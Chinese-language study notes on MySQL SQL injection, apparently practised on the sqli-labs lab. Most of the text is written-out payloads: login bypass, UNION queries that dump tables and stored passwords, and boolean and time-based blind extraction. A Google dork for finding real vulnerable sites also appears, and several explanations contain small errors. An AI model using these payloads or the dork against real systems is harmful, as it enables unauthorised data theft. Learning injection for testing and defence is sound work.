SQL 注入漏洞是一种通过将恶意的 SQL 代码注入到应用程序的数据库查询中，从而未经授权地访问、修改或破坏数据库数据的安全漏洞。

## 1 MySQL 的 SQL 注入

> 在 sql 语句中 1 位数字，'1' 为字符，（但是1=’1‘），'a' 必须有单引号

当在前端输入用户名和密码时，系统可能会执行以下命令查询数据库中匹配的用户名和密码

```sql
select * from users where username='用户名' and password='密码'
```

在没有过滤的表单中可以在用户名提交以下字符

```
admin' or 1=1 --空格
```

> `--空格` 代表注释，有时需要使用 `#` 注释

得到

```sql
select * from users where username='admin' or 1=1 -- ' and password='密码'
```

> 若想防止这种 SQL 注入，将用户名和密码分开匹配即可

1. **单引号测试（'）：**

   ```
   ?id=1'
   ```

2. **双引号测试（"）：**

   ```
   ?id=1"
   ```

3. **错误消息分析：**

   ```
   ?id=1' AND 1=1--
   ?id=1' AND 1=2--
   ```

4. **布尔测试：**

   ```
   ?id=1' AND SLEEP(5)--
   ?id=1' AND 1=2 UNION SELECT 1,2,3--
   ```

5. **时间延迟测试：**

   ```
   ?id=1' AND SLEEP(5)--
   ?id=1' WAITFOR DELAY '0:0:5'--
   ```

6. **报错注入：**

   ```
   ?id=1' UNION SELECT 1,@@VERSION,3--
   ```

7. **逻辑测试：**

   ```
   ?id=1' OR '1'='1
   ?id=1' AND '1'='2
   ```

## 2 分类

数字型

```
select * from sec where id=1
```

字符型

```
select * from sec where id='1'
```

搜索型

```
select * from sec where id like '%1%'
```

json型

```
{
    "id":"1"
}
```

## 3 注入方式

布尔注入：

根据返回页面的真假判断

联合查询：

使用 union 注入

延时注入：

根据页面的响应时间判断

报错注入：

把注入的语句返回到页面中

## 4 查找

谷歌语法：`inurl:"php?id=" site:".com.cn"`

注入

## 5 判断是否存在 SQL 注入

1. **单引号测试（'）：**

   ```
   ?id=1'
   ```

2. **双引号测试（"）：**

   ```
   ?id=1"
   ```

3. **错误消息分析：**

   ```
   ?id=1' AND 1=1-- 
   ?id=1' AND 1=2-- 
   ```

4. **布尔测试：**

   ```
   ?id=1' AND SLEEP(5)-- 
   ?id=1' AND 1=2 UNION SELECT 1,2,3-- 
   ```

5. **时间延迟测试：**

   ```
   ?id=1' AND SLEEP(5)-- 
   ?id=1' WAITFOR DELAY '0:0:5'-- 
   ```

6. **报错注入：**

   ```
   ?id=1' UNION SELECT 1,@@VERSION,3-- 
   ```

7. **逻辑测试：**

   ```
   ?id=1' OR '1'='1
   ?id=1' AND '1'='2
   ```

8. **顺序注入**

   ```
   ?id=1 order by 1
   ?id=1 order by 100
   ```

### 5.1 数字型

尝试传递逻辑错误

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=0
```

> 报错则说明存在 sql 注入

修改逻辑使之正常访问

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=1
```

### 5.2 字符型

尝试传递特殊字符 `` `

```
http://192.168.1.76/sqli-labs/Less-1/?id=1'
```

> 当传递 `'` 时报错

添加注释使之正常访问

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' --+
```

> 在 mysql 中提交 `+` 相当于空格

或者手动闭合

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and '1
```

> 返回正常说明存在 SQL 注入

### 5.3 搜索型（待补充）

```
1%' and 1=1 and '%'='
```

### 5.4 json型（待补充）

```
{
    "id":"1 and 1=1"
}
```

## 6 判断闭合方式

### 6.1 字符型

输入反斜杠 `\` 来判断页面使用的哪种闭合方式

```
http://192.168.1.76/sqli-labs/Less-1/?id=1\
```

> 报错 `'1\' LIMIT 0,1` ， `\` 转义符后的 `'` 被转义，相当于 `'1 LIMIT 0,1` 造成报错，说明此 sql 语句基于 `'` 闭合。

| 常见手动 sql 注入的闭合方式 |
| :-------------------------: |
|              '              |
|              "              |
|              )              |
|             ')              |
|             ")              |
|             "))             |

## 7 判断字段数量

### 7.1 数字型

提交正确的逻辑，利用 order by 判断有几个字段

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=1 order by 4
```

> 当写入使用第 4 个字段排序时报错，说明后台查询有 3 个字段

### 7.2 字符型

浏览器访问

>http://192.168.1.76/sqli-labs/Less-1/

使用 HackBar 写入 order by 判断有几个字段，注意闭合

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' order by 4 --+
```

> 当写入使用第 4 个字段排序时报错，说明后台查询有 3 个字段
>
> 不一定是数据表的字段数，原因是后台查询可能不是 `select *` 可能是 `select id,username` 此时只有两个字段，当 `order by 3`  时即会报错

## 8 联合查询

使用 `union` 的查询方式

> 使用 `union` 时需要使 `union` 之前的语句出现逻辑错误，才会显示之后的反馈

> http://192.168.1.76/sqli-labs/Less-1/

### 8.1 爆显示位置

### 8.1.1 数字型

在 hackbar 提交

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=0 union select 1,2
```

> 查询字段必须相同

### 8.1.2 字符型

已知字段数量为 3 ，在 hackbar 提交

```
http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
```

> 字符型的错误要注意加闭合符 `'1' union select 1,2,3`

### 8.2 爆库

在有回显的位置显示当前数据库名

```
http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,database() --+
```

也可以通过这种方式得到数据库的其它信息

| 操作                 | 描述         |
| -------------------- | ------------ |
| version()            | mysql 版本   |
| user()               | 数据库用户名 |
| database()           | 数据库名     |
| @@datadir            | 数据库路径   |
| @@version_compile_os | 系统版本     |

### 8.3 爆表

> 在 mysql 中有一个元数据库 `information_schema` 其中有
>
>  `tables` 数据表，存储了所有数据库和数据表的关系
>
> > 其中 `table_schema` 字段存储了所有数据库名
> >
> > 还有 `table_name` 字段存储了所有数据库对应的表名
>
>  `columns`  数据表，存储了所有的数据表和字段的关系
>
> > 其中 `column_schema`  字段存储了所有数据表名
> >
> > 还有 `column_name` 字段存储了所有数据表对应的字段名

获取当前数据库下的所有数据表

```
http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```

> 其中 `table_name` 中有很多字段，需要用 `group_concat（）` 组合到一起查看

或者将语句整合（推荐）

```
http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+
```

又或者不用 `group_concat` ，使用 `limit` 分次显示

```
http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1) --+
```

得到数据表：emails,referers,uagents,users

### 8.4 爆字段

显示 `users` 数据表中的所有字段

```
http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users') --+
```

### 8.5 拖库

显示 `users` 数据表中的所有数据

```
http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,(select group_concat(username,'_',password) from users) --+
```

> 其中 `_` 为添加的分隔符，可以替换成任意字符

若数据很多可用 `limit` 分次显示

```
http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(username,'--',password) from (select username,password from users limit 0,1)a --+
```

> 此时必须设置临时数据表别名 `a`

也可以使用换行显示多条数据

```
http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(username,0x5F,password,0x3C,0x68,0x72,0x2F,0x3E) from (select username,password from users limit 0,4)a --+
```

> `0x5F` 为下划线的换行符
>
> `0x3C,0x68,0x72,0x2F,0x3E` 为换行符的 ascii 码

## 9 布尔盲注

> http://192.168.1.76/sqli-labs/Less-1/

当没有回显时，可以根据反馈信息的真假进行注入

### 9.1 爆库

判断数据库长度

> 通过使用 `length` 计算字段的长度判断真假（一个汉字为 3 个字符，一个数字或字母为 1 个字符）

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and (length(database()) > 10) --+
```

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and (length(database()) = 8) --+
```

> 通过二分法缩小范围，当长度为 8 时不报错
>
> 得到数据库的长度为 8 个字符

判断数据库名

> 用 `substr` 从数据库中取出第一个字符

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(substr(database(),1,1)) > 100 --+
```

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(substr(database(),1,1)) = 115 --+
```

> 用二分法判断 `ascii` 数值
>
> 第一个字符的 ascii 码为 115，字符为 s

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(substr(database(),2,1)) = 101 --+
```

> 第二个字符的 ascii 码为 101，字符为 e
>
> 最后得到数据库名为 security

`mid` 与 `substr` 效果相同

 `left` （从左侧第一个开始取三个字符）

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(left(database(),3)) > 100 --+
```

 `right` （从右侧第一个开始区三个字符）

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(right(database(),3)) > 100 --+
```

### 9.2 爆表

判断数据表的个数

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from information_schema.tables where table_schema=database())=4 --+
```

> 数据表为 4 个

当 `information_schema` 被过滤时使用 `sys.schema`

> 在 `mysql 5.7` 中新增了 `sys.schema` 基础数据来自于 `performance_chema` 和 `information_schema` 两个库，本身数据库不存储数据

判断第一个数据表的长度

```
?id=1' and （select length(table_name）from information_schema.tables where table_schema=database() limit 0,1)=1 --+
```



### 9.3 爆字段

判断字段的个数

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users')=3 --+
```

> 字段为 3 个

当 `information_schema` 被过滤时使用 `sys.schema`

> 在 `mysql 5.7` 中新增了 `sys.schema` 基础数据来自于 `performance_chema` 和 `information_schema` 两个库，本身数据库不存储数据

### 9.4 拖库

## 10 时间盲注

当反馈信息没有区别时，可以根据响应时间进行注入

> http://192.168.1.76/sqli-labs/Less-8/

### 10.1 判断是否存在 SQL 注入

尝试传递特殊字符 `` `

```
http://192.168.1.76/sqli-labs/Less-8/?id=1'
```

> 当传递 `'` 时报错，说明符号被注入，存在 SQL 注入
>
> 但是没有回显

添加注释使之正常访问

```
http://192.168.1.76/sqli-labs/Less-8/?id=1' --+
```

### 10.2 爆库

判断数据库长度

> 通过使用 `length` 计算字段的长度判断真假（一个汉字为 3 个字符，一个数字或字母为 1 个字符）

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and if(length(database()) > 10,sleep(3),1) --+
```

> 最后得到数据库长度为 8

判断数据库名

```
http://192.168.1.76/sqli-labs/Less-8/?id=1' and if(ascii(substr(database(),1,1)) = 100,sleep(3),1) --+
```

> 当数据库的第一个字符 ascii 码长度为 100 时，则正常，否则休眠三秒
>
> 最后得到 ascii 码为 150

### 10.3 爆表

### 10.4 爆字段

### 10.5 拖库
